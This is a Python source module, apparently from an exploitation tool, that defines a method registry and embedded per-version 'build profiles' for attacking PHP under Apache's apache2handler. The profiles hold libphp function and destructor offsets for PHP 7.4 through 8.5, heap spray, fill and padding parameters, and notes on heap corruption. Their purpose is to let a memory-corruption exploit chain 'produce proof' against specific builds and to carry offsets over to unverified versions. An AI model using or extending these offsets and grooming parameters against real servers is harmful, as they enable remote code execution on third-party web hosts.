"""Method registry and embedded build profiles.

Adding a technique means adding **one dict entry** (and, for a chain, one
callable). Nothing in the CLI, precheck or routing needs to change: the
registry is the single extension surface.

Kinds
-----
``precheck``   one measurement pass (banner, SAPI, front, brackets, ...)
``calibrate``  a derivation pass that writes into the target profile
``chain``      an execution method that consumes a profile and produces proof

Status
------
``stable``        lab-proven, safe to run where the routing table says so
``experimental``  implemented and exercised, but not proven across builds
``stub``          deliberately unimplemented; the routing table may name it,
                  but it never executes

The stubs are first-class registry citizens: they appear in ``--list`` and in
the sealed coverage summary, so the gap is visible rather than folklore.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable, Optional

# ---------------------------------------------------------------------------
# Embedded build profiles
# ---------------------------------------------------------------------------
# Offset table from the repository's profiles/ directory. ``zif`` and ``dtor``
# are libphp-relative; ``table`` is chunk-relative and is shared because the
# dispatch geometry is an image+shape property, not a container property.
#
# ``rotate`` is the worker-normalisation mode: "full" posts the minimal
# session-end request after the fill (8.4 behaviour); "fill" stops after the
# fill, because on 8.5 the follow-up runs against a heap the fill already
# corrupted and takes the worker with it.
#
# ``zif`` is a *list*: a banner cannot tell amd64 from aarch64, and two
# verified builds of the same version carry different offsets. The chain
# ladders through the candidates and lets the proof decide.
BASE_PROFILE = {
    "sapi": "apache2handler",
    "table": 0xB30D8,
    "rotate": "full",
    "producer": "field",           # "bomb" | "field"
    "bomb_lines": 470_000,
    # N1 header-run wire width: 2 = ":" + LF (default), 3 = the "x:" control.
    "bomb_line_width": 2,
    "huge_mb": 129,
    "live_n": 800,
    "live_len": 31,
    "fill_n": 4,
    "spray": 15,
    "carrier": "live",
    "progress_late": True,
    "pads": ["31:31"] * 6 + ["7:7"] * 66,
    "decoy_n": 2,
    "source": "embedded",
}

BUILD_PROFILES = {
    "8.4.25": dict(
        zif=[0x42FA30], dtor=0x637AE0, table=0xB30D8, rotate="full",
        producer="bomb", verified=True, arch="node",
    ),
    "8.4.26": dict(
        zif=[0x465370], dtor=0x65EB60, table=0xB30D8, rotate="full",
        producer="bomb", verified=True, arch="node",
    ),
    "8.5.10": dict(
        zif=[0x52E130], dtor=0x75D360, table=0xB30D8, rotate="fill",
        producer="field", verified=True, arch="node",
    ),
    "8.5.11": dict(
        # amd64 verified end-to-end (12/12 lineage, re-proven by this tool);
        # aarch64 offsets are carried as the second candidate.
        zif=[0x5996E0, 0x5314F0], dtor=0x7B47A0, table=0xB30D8, rotate="fill",
        producer="field", verified=True, arch="node",
    ),
    "8.3.35": dict(
        zif=[0x377428], dtor=0x46FCC0, table=0xB30D8, rotate="fill",
        producer="field", verified=False, arch="node",
    ),
}

# Offsets are also known for builds that are *not* chain-verified. They are
# useful for calibration transfer and for a version-tier report.
OFFSET_ONLY = {
    "7.4.33": dict(zif=[0x309640], dtor=0x3F6024),
    "8.0.30": dict(zif=[0x31EF70], dtor=0x40DDB0),
    "8.1.34": dict(zif=[0x341E08], dtor=0x42E7A0),
    "8.2.0": dict(zif=[0x364F30], dtor=0x4520C0),
    "8.2.34": dict(zif=[0x36FF48], dtor=0x4606C0),
    "8.3.0": dict(zif=[0x3771F0], dtor=0x467CF0),
    "8.3.33": dict(zif=[0x377248], dtor=0x4737E0),
}


def profile_for(version_text: str, *, allow_branch: bool = True) -> Optional[dict]:
    """Resolve a build profile by exact version, then by branch."""
    if not version_text:
        return None
    if version_text in BUILD_PROFILES:
        profile = dict(BASE_PROFILE)
        profile.update(BUILD_PROFILES[version_text])
        profile["version"] = version_text
        return profile
    if version_text in OFFSET_ONLY:
        profile = dict(BASE_PROFILE)
        profile.update(OFFSET_ONLY[version_text])
        profile["version"] = version_text
        profile["verified"] = False
        profile["producer"] = "field"
        profile["source"] = "offsets-only"
        return profile
    if allow_branch:
        branch = ".".join(version_text.split(".")[:2])
        candidates = [
            version
            for version in BUILD_PROFILES
            if version.startswith(branch + ".")
        ]
        if candidates:
            # Nearest build in the branch: the patch level influences the
            # layout, so only use it as a transfer starting point.
            nearest = max(candidates, key=lambda v: tuple(int(p) for p in v.split(".")))
            profile = dict(BASE_PROFILE)
            profile.update(BUILD_PROFILES[nearest])
            profile["version"] = version_text
            profile["transferred_from"] = nearest
            profile["verified"] = False
            profile["source"] = "branch-transfer"
            return profile
    return None


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------
@dataclass
class Method:
    name: str
    kind: str                 # precheck | calibrate | chain
    status: str               # stable | experimental | stub
    description: str
    execute: Optional[Callable] = None
    requires: tuple = ()
    order: int = 100
    tags: tuple = ()
    notes: str = ""

    def as_dict(self) -> dict:
        return {
            "name": self.name,
            "kind": self.kind,
            "status": self.status,
            "description": self.description,
            "requires": list(self.requires),
            "order": self.order,
            "tags": list(self.tags),
            "notes": self.notes,
        }


METHODS: dict[str, Method] = {}


def method(
    name: str,
    *,
    kind: str,
    status: str = "stable",
    description: str = "",
    requires: tuple = (),
    order: int = 100,
    tags: tuple = (),
    notes: str = "",
):
    """Decorator registering a method."""

    if kind not in ("precheck", "calibrate", "chain"):
        raise ValueError(f"unknown method kind {kind!r}")
    if status not in ("stable", "experimental", "stub"):
        raise ValueError(f"unknown method status {status!r}")

    def wrap(func):
        entry = Method(
            name=name,
            kind=kind,
            status=status,
            description=description or (func.__doc__ or "").strip().split("\n")[0],
            execute=func,
            requires=requires,
            order=order,
            tags=tags,
            notes=notes,
        )
        if name in METHODS:
            raise ValueError(f"duplicate method {name!r}")
        METHODS[name] = entry
        return func

    return wrap


def get(name: str) -> Method:
    if name not in METHODS:
        raise KeyError(f"no such method: {name}")
    return METHODS[name]


def by_kind(kind: str) -> list[Method]:
    return sorted(
        (m for m in METHODS.values() if m.kind == kind),
        key=lambda m: (m.order, m.name),
    )


def summary() -> dict:
    counts: dict[str, dict[str, int]] = {}
    for entry in METHODS.values():
        counts.setdefault(entry.kind, {}).setdefault(entry.status, 0)
        counts[entry.kind][entry.status] += 1
    return {
        "counts": counts,
        "methods": [m.as_dict() for m in sorted(METHODS.values(), key=lambda m: (m.kind, m.order, m.name))],
    }
